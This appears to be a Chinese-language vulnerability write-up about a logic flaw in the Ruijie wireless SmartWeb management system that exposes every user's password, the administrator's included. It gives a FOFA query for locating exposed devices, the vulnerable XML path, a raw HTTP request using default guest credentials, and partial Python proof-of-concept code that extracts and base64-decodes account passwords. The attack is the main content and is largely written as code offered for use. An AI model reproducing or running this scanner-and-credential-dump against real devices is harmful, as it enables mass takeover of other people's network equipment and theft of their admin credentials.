一.漏洞背景 

    锐捷无线SmartWeb管理系统存在逻辑缺陷漏洞，满足一个条件已知一个用户 这里可以翻阅手册发现有guest低权限用户，通过它我们可获取所有用户账号密码包含管理员。密码为base64编码。


漏洞复现

祭出fofa大法，fofa语法如下

title="无线smartWeb"

漏洞位置

/web/xml/webuser-auth.xml

登陆低权限用户可以看见已经有用户跟密码了。密码为base64编码


拿去解密下 

poc编写 得到关键信息 1漏洞位置 2.低权限登陆 

GET /web/xml/webuser-auth.xml HTTP/1.1Cookie: login=1; oid=1.3.6.1.4.1.4881.1.1.10.1.3; type=WS5302;auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest

那么开始写关键代码  其余的自己补全 不能啥都写完了得自己思考下特别是正则表达式 每个人写法也都有不同

    url = target_url +'/web/xml/webuser-auth.xml'    headers = {        'Cookie': 'auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest; login=1; oid=1.3.6.1.4.1.4881.1.1.10.1.3; type=WS5302'    }    try:        r = requests.get(url=url, headers=headers, timeout=10, verify=False)        data = r.text        if r.status_code == 200 and 'Authorization Required' not in data:            webuser = re.search(r'<user><name><!\[CDATA\[   (.*?)\]\]></name>', data, re.M | re.I)  # 正则匹配            if webuser:                print("\033[32m[o] 登陆地址 {}\033[0m".format(target_url))                print("\033[31m账号：" + webuser.group(1))            wbasspass = re.search(r'<password><!\[CDATA\[   (.*?)\]\]></password>', data, re.M | re.I)  # 正则匹配            if wbasspass:                mima = wbasspass.group(1)                temp = base64.b64decode(mima)                print("\033[31m密码：" + temp.decode())                print('__' * 25)
